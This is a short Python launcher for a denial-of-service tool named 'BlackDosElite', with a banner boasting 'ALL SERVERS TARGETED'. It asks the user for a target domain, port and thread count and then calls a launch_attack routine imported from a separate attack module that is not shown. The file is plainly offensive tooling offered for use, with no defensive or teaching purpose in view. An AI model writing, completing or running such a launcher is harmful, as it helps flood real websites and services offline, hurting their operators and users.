from attack import BlackDosElite
from rich.console import Console

def display_banner():
    return """
[bold red]
█▄▄ █░░ ▄▀█ █▀▀ █▄▀   █▀▄ █▀█ █▀   █▀▀ █░░ █ ▀█▀ █▀▀
█▄█ █▄▄ █▀█ █▄▄ █░█   █▄▀ █▄█ ▄█   ██▄ █▄▄ █ ░█░ ██▄
[/bold red]
[bold yellow]MAXIMUM POWER EDITION | ALL SERVERS TARGETED[/bold yellow]
"""

def main():
    console = Console()
    console.print(display_banner())
    
    target = console.input("[bold cyan]Enter main target domain: [/bold cyan]")
    port = int(console.input("[bold cyan]Enter port (default 80): [/bold cyan]") or 80)
    threads = int(console.input("[bold cyan]Number of threads per server: [/bold cyan]"))
    
    attacker = BlackDosElite()
    try:
        console.print("[bold red]Launching distributed attack system...[/bold red]")
        attacker.launch_attack(target, port, threads)
    except KeyboardInterrupt:
        attacker.running = False
        console.print("\n[bold yellow]Mass attack terminated![/bold yellow]")

if __name__ == "__main__":
    main()
